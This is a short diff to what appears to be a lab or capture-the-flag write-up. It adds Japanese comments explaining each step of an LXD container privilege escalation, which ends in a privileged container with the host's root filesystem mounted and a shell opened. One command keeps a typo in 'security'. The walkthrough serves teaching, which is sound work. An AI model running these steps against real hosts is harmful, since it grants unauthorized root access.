@@ -11,10 +11,11 @@ ls
 lxd.tar.xz rootfs.squashfs
 which lxc
 /usr/bin/lxc
-lxc image import lxd.tar.xz rootfs.squashfs --alias container
-lxc image list 
-lxc init container privesc -c serurity.privileged=true
-lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
-lxc start privesc
-lxc exec privesc /bim/sh
+lxc image import lxd.tar.xz rootfs.squashfs --alias container # コンテナイメージをLXDにインポートし、containerというエイリアスで登録
+lxc image list # 登録したイメージを確認
+lxc init container privesc -c serurity.privileged=true # 登録したイメージをもとに、privescという特権コンテナを作成。
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true # 作成した特権コンテナの設定を変更。ターゲットのルートを/mnt/rootにマウント。
+lxc start privesc # 起動
+lxc exec privesc /bin/sh # 起動したコンテナで/bin/shを実行
+
 ```
